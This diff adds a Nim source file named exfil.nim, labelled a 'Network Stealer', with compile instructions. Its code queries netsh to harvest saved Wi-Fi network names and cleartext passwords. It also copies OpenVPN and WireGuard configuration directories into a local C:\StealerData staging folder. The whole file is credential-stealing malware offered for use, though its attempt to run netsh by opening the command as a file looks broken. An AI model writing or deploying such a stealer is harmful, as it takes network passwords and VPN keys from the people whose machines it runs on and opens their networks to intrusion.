@@ -1,0 +1,47 @@
+# ============================================================
+# exfil.nim - Nim Network Stealer
+# Compile: nim c -d:release --opt:size exfil.nim
+# ============================================================
+
+import os, strutils
+
+proc collectWifi() =
+  var output = ""
+  var pipe: File
+  if pipe.open("netsh wlan show profiles", fmRead):
+    var line = newString(512)
+    while pipe.readLine(line):
+      if "All User Profile" in line:
+        var profile = line.split(":")[1].strip()
+        var pipe2: File
+        if pipe2.open("netsh wlan show profile \"" & profile & "\" key=clear", fmRead):
+          var line2 = newString(512)
+          while pipe2.readLine(line2):
+            if "Key Content" in line2:
+              var password = line2.split(":")[1].strip()
+              output &= "SSID: " & profile & "\nPass: " & password & "\n\n"
+          pipe2.close()
+    pipe.close()
+  
+  writeFile("C:\\StealerData\\wifi_nim.txt", output)
+
+proc collectVPN() =
+  let vpnPaths = [
+    "C:\\Program Files\\OpenVPN\\config",
+    "C:\\Program Files\\WireGuard\\Data"
+  ]
+  
+  for path in vpnPaths:
+    if dirExists(path):
+      let dest = "C:\\StealerData\\vpn\\" & extractFilename(path)
+      createDir(dest)
+      for file in walkDirRec(path):
+        copyFile(file, dest / extractFilename(file))
+
+proc main() =
+  createDir("C:\\StealerData\\vpn")
+  collectWifi()
+  collectVPN()
+
+when isMainModule:
+  main()
